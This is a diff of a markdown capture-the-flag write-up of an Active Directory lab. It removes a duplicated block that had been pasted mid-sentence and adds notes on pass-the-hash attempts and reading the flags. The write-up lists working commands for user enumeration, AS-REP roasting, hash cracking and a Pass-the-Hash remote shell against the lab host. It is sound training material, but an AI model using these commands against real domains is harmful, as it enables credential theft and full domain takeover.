@@ -170,171 +170,7 @@ After searching online, I identified the Hashcat mode for the collected AS-REP h
 | --- | --- |
 | `18200` | Kerberos 5, etype 23, AS-REP |
 
-The hash began with `$krb5asrep$23# Attacktive Directory — TryHackMe
-
-## Overview
-
-In this lab, I enumerated an Active Directory domain, identified an account with Kerberos pre-authentication disabled, and cracked its AS-REP material offline. I then accessed an SMB share containing credentials for the `backup` account, used those credentials to extract domain account hashes, and authenticated as Administrator through Pass-the-Hash.
-
-**Attack chain:** Domain enumeration → AS-REP Roasting → Offline password cracking → SMB credential discovery → DCSync (as explained in the TryHackMe task) → Administrator access through Pass-the-Hash.
-
-> This writeup combines several sessions of the same lab. Target IPs changed between sessions; the commands retain the IPs used at the time. When repeating the lab, use the IP assigned to the current session.
-
-## 1. Port Scanning
-
-I used Nmap with `-Pn` to identify open ports on the lab target. The `-Pn` option skips host discovery and treats the target as online. One of the ports I found was **389 (LDAP)**.
-
-LDAP is used to query directory information, so I chose to investigate it for details about the target's domain.
-
-### Scan Results (Later Session)
-
-```text
-Nmap scan report for 10.145.149.203
-Host is up (0.039s latency).
-Not shown: 986 closed tcp ports (reset)
-PORT     STATE SERVICE
-53/tcp   open  domain
-80/tcp   open  http
-88/tcp   open  kerberos-sec
-135/tcp  open  msrpc
-139/tcp  open  netbios-ssn
-389/tcp  open  ldap
-445/tcp  open  microsoft-ds
-464/tcp  open  kpasswd5
-593/tcp  open  http-rpc-epmap
-636/tcp  open  ldapssl
-3268/tcp open  globalcatLDAP
-3269/tcp open  globalcatLDAPssl
-3389/tcp open  ms-wbt-server
-5985/tcp open  wsman
-```
-
-The combination of Kerberos (`88`), LDAP (`389`), SMB (`445`), and Global Catalog (`3268`/`3269`) is consistent with an Active Directory domain controller. These services provide useful starting points for domain enumeration. The service names above are Nmap's port labels, not confirmed software versions.
-
-## 2. LDAP Enumeration
-
-I used `ldapsearch` to query the LDAP service and found the following attribute:
-
-```text
-ldapServiceName: spookysec.local:attacktivedirec$@SPOOKYSEC.LOCAL
-```
-
-This gave me the following information:
-
-| Value | Meaning |
-| --- | --- |
-| `spookysec.local` | Domain name |
-| `attacktivedirec$` | Computer account name |
-| `SPOOKYSEC.LOCAL` | Kerberos realm |
-
-The domain name is useful for later domain enumeration and authentication-related commands.
-
-### Command Used
-
-```bash
-ldapsearch -x -H ldap://10.146.158.66 -b "" -s base
-```
-
-- `-x`: use simple authentication instead of SASL; with no credentials supplied, this is an anonymous query.
-- `-H`: specify the LDAP server URL.
-- `-b ""`: use an empty search base to query the RootDSE.
-- `-s base`: query only the base entry.
-
-This queries the server’s RootDSE for basic directory information; it does not enumerate all domain users.
-
-## 3. Username Enumeration with Kerbrute
-
-I used Kerbrute with `userlist.txt`, a username wordlist provided by TryHackMe, to identify valid usernames in the `spookysec.local` domain.
-
-Kerbrute checks candidate usernames through Kerberos. Finding valid usernames gives me accounts to investigate in the next steps.
-
-### Interesting Results
-
-The results included the following usernames:
-
-```text
-svc-admin@spookysec.local
-backup@spookysec.local
-Administrator@spookysec.local
-administrator@spookysec.local
-```
-
-`Administrator` and `administrator` normally refer to the same AD account because usernames are case-insensitive.
-
-The name `svc-admin` suggests a possible service account, but the name alone does not confirm its purpose or privileges.
-
-The `backup` username provided another lead for investigation. At this stage, its name alone did not establish its purpose or privileges.
-
-### Command Used
-
-```bash
-~/go/bin/kerbrute userenum -d spookysec.local --dc 10.146.158.66 userlist.txt -o valid-users.log
-```
-
-- `userenum`: enumerate valid usernames.
-- `-d spookysec.local`: specify the target domain.
-- `--dc 10.146.158.66`: specify the domain controller.
-- `userlist.txt`: provide the candidate username wordlist.
-- `-o valid-users.log`: save Kerbrute's log output to a file.
-
-### Troubleshooting: Executable Path
-
-I initially tried `./kerbrute`, but received `zsh: no such file or directory: ./kerbrute`. The `./` prefix refers to the current directory, while my Kerbrute executable was located in `~/go/bin/`.
-
-I resolved this by running `~/go/bin/kerbrute` instead. I did not need to change directories because I supplied the executable's path.
-
-## 4. AS-REP Roasting Check with GetNPUsers
-
-I used Impacket's `GetNPUsers` to check whether any accounts in `userlist.txt` had Kerberos pre-authentication disabled.
-
-For accounts with this setting, the domain controller can return an AS-REP without requiring the account's password. Part of that response can be used for offline password cracking. This technique is called **AS-REP Roasting**.
-
-### Command Used
-
-```bash
-impacket-GetNPUsers -no-pass spookysec.local/ -usersfile userlist.txt -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
-```
-
-- `-no-pass`: do not prompt for a password.
-- `spookysec.local/`: specify the target domain without supplying a username after the slash.
-- `-usersfile userlist.txt`: check the candidate usernames in this file.
-- `-dc-ip 10.146.158.66`: specify the domain controller's IP address.
-- `-format hashcat`: format any collected AS-REP cracking material for Hashcat.
-- `-outputfile asrep.txt`: save any collected AS-REP cracking material to this file.
-
-### Targeted Check: svc-admin
-
-Checking the entire `userlist.txt` was taking too long, so I switched to checking `svc-admin`, one of the valid usernames found with Kerbrute.
-
-```bash
-impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
-```
-
-Unlike the earlier command with `-usersfile`, this command targets a single account: `svc-admin`.
-
-### Results
-
-The command returned AS-REP cracking material for `svc-admin`:
-
-```text
-[*] Getting TGT for svc-admin
-$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<checksum>:<encrypted-data>
-```
-
-The checksum and encrypted data are abbreviated here for readability. The command uses `asrep.txt` as the output file for the full value.
-
-This confirms that `svc-admin` has Kerberos pre-authentication disabled. I obtained an AS-REP hash suitable for offline password cracking, not the plaintext password. The subsequent cracking attempt is documented in Section 6.
-
-
-## 5. Identifying the Hashcat Mode
-
-After searching online, I identified the Hashcat mode for the collected AS-REP hash:
-
-| Hashcat Mode | Hash Type |
-| --- | --- |
-| `18200` | Kerberos 5, etype 23, AS-REP |
-
-, which identified mode `18200` as the appropriate choice for the cracking attempt.
+The hash began with `$krb5asrep$23`, which identified mode `18200` as the appropriate choice for the cracking attempt.
 
 The cracking command and result are documented in Section 6.
 
@@ -489,6 +325,10 @@ This explains why the recovered credentials were useful beyond accessing a file 
 
 The lab explanation identifies this step as DCSync. My recorded output confirms that I obtained the Administrator hash; I did not independently enumerate the account's replication permissions or preserve the output identifying the extraction method.
 
+### Other Accounts in the Output
+
+The output also included entries for `guest` and `krbtgt`. I tried their hashes with `evil-winrm-py`, but neither provided access. Only the Administrator hash obtained here worked for the remote session documented in Section 11.
+
 I used the Administrator NT hash for the remote connection documented in Section 11.
 
 ## 11. Administrator Remote PowerShell Session via Pass-the-Hash
@@ -515,17 +355,44 @@ evil-winrm-py PS C:\Users\Administrator\Documents> ls
 
 This records a successful remote shell connection using the Administrator account's hash. Pass-the-Hash uses the hash for authentication; it does not recover the plaintext password.
 
-## 12. Locating the Lab Flags
+### Identity Check with whoami
 
-After obtaining the remote PowerShell session, I located the following lab flags and files:
+From the svc-admin desktop directory, I ran `whoami`:
+
+```text
+evil-winrm-py PS C:\users\svc-admin\Desktop> whoami
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+thm-ad\administrator
+```
+
+The warning above came from the terminal's spnego library, not from `whoami` itself. The `thm-ad\administrator` result confirmed that the session was running as Administrator, even though the current directory was the svc-admin desktop.
+
+## 12. Locating and Reading the Lab Flags
+
+After obtaining the remote PowerShell session, I read each lab flag from its desktop location. Flag values are omitted from this writeup.
 
 | Account | Location | Finding |
 | --- | --- | --- |
 | `Administrator` | `C:\Users\Administrator\Desktop\root.txt` | Administrator flag |
-| `backup` | `C:\Users\backup\Desktop\PrivEsc.txt` | File named `PrivEsc.txt` |
+| `backup` | `C:\Users\backup\Desktop\PrivEsc.txt` | backup flag |
 | `svc-admin` | `C:\Users\svc-admin\Desktop\user.txt.txt` | svc-admin flag |
 
-Flag values are omitted from this writeup. I have not yet documented the contents of `PrivEsc.txt`, so its purpose is not inferred from its name alone.
+### Commands Used
+
+```text
+C:\users\svc-admin\Desktop> cat user.txt.txt
+```
+
+```text
+C:\Users\backup\desktop> cat PrivEsc.txt
+```
+
+```text
+C:\Users\Administrator\desktop> cat root.txt
+```
+
+`PrivEsc.txt` is confirmed here as the backup account's flag, not merely a file with a suggestive name.
 
 ## What I Learned
 
